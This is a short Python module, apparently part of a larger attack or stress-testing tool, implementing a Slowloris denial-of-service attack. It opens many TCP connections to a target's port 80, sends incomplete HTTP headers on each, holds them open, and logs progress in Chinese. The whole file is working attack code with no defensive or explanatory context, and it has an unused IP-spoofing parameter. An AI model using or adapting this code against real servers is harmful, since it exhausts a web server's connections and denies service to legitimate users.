import socket
import time

def attack(ip, packet_count, log_func, spoof_ip=None):
    log_func(f"[Slowloris] 模擬維持開啟連線")
    try:
        sockets = []
        for i in range(packet_count):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, 80))
            s.send(f"GET /?{i} HTTP/1.1\r\n".encode("utf-8"))
            s.send(b"User-Agent: Slowloris\r\n")
            s.send(b"Accept-language: en-US\r\n")
            sockets.append(s)
            log_func(f"[Slowloris] 已建立第 {i+1} 條連線")
        time.sleep(5)
        for s in sockets:
            s.close()
    except Exception as e:
        log_func(f"[Slowloris] 錯誤：{e}")
    return True